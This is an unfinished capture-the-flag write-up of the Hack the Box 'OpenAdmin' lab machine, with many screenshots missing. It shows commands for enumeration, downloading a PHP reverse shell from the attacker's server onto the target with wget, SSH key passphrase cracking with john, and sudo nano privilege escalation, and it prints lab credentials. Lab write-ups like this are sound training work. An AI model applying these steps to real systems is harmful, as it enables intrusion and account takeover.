
# Work in progress

![OpenAdmin](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/ENXDIZYX0AAIur8.jpg)


## Enumeration

Start off with a detailed nmap scan:

![nmap](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/nmap.png)

Next lets navigate to the webserver in our browser to verify that this in fact the apache default page:

```
http://10.10.10.171/
```
![webserver]

As expexted we get the apache default page.  Let's enumerate futher using gobuster:
```
gobuster -w /usr/share/wordlists/dirb/common.txt -t 30 -k -x html,php,txt,asp,aspx -u http://10.10.10.171
```
![gobuster](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/gobuster.png)

Let's look at the music page:

Music:

![music](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/music.png)

I clicked 'login' and it sent me to this page http://10.10.10.171/ona/:

![ona](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/ona.png)

Looks like the web appliaction that is running is out of date.  Now click the "ONA" and "About":

![about](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/ona_about.png)


Lets see if there are any vulnerabilities for OpenNetAdmin (ONA):

![searchsploit](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/OpenAdmin/Images/searchsploit.png)

## Initial Foothold

After looking at the proof of concept found in exploitdb, we just need to edit the URL to point to the ONA web application:

![poc]()

Execute the bash script with the changes and we get a limited shell on the machine:

![shell]()

We are dropped in the /opt/www/ona directory, which is the root for ONA

## Pivoting to User 1

We cannot spawn a tty shell from here, so lets see if we can upload and execute a php-reverse-shell using the following commands:

```
# on our attacking machine
python -m SimpleHTTPServer

# on the target
wget http://10.10.14.152:8000/php-reverse-shell.php

# on either machine, ensure that you have a netcat listener before executing this
curl http://10.10.10.171/ona/php-reverse-shell.php
```

![phpshell]()

I tried to access the user.txt file in the home directories of both users but was denied:

![userdeny]()

After looking through the /var/www/ona directory (linked to /opt/ona/www), I found a database configuration file with a password:

![dbfile]()

Lets try to ssh with the credentials jimmy:n1nj4W4rri0R!:

![jimmy_shell]()

## Pivoting to User 2

Success!  But there is no user.txt file in jimmy's home directory:

![jimmyhome]()

Jimmy cannot sudo on this device or access joanna's home directory.  Looking through the webroot /var/www I found an interesting directory called internal:

![internal]()

Let's look at main.php:

![main]()

So if we connect to this webserver, we should receive the private key (id_rsa) for joanna which we can then use to login.  Lets see if the we are listening on port 80:

![netstat]()

The target is not listening on port 80, but is listening on port 52846, so lets try to connect to that to retrieve the private key:

```
curl http://127.0.0.1:52846/main.php
```
![rsa]()

We got the private key, but the message from main.php indicates that this private key is password protected, so we will need to use ssh2john (link) and john to crack the password:

Generate a crackable hash with ssh2john:

```
python /usr/share/john/ssh2john.py id_rsa > crack.txt
```
Now crack it with john:
```
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
```
![john]()

The password for id_rsa is bloodninjas, which goes along with the hint of "ninja" password we saw in the id_rsa.  Now lets try to login as joanna using the private key:

![joanna_shell]()

## User File 

![userfile]()

## Privilege Escalation

Start by checking if joanna is allowed to run any commands with sudo:

![sudol]()

Looks like we can open the file priv using nano with root privilieges:
```
Sudo /bin/nano /opt/priv 
```
There is a native ability in nano to read (CTRL+R) any file in the file system that you specify.  Lets try to read the root.txt file:

![nanoroot]()

## Root File 

![rootfile]()
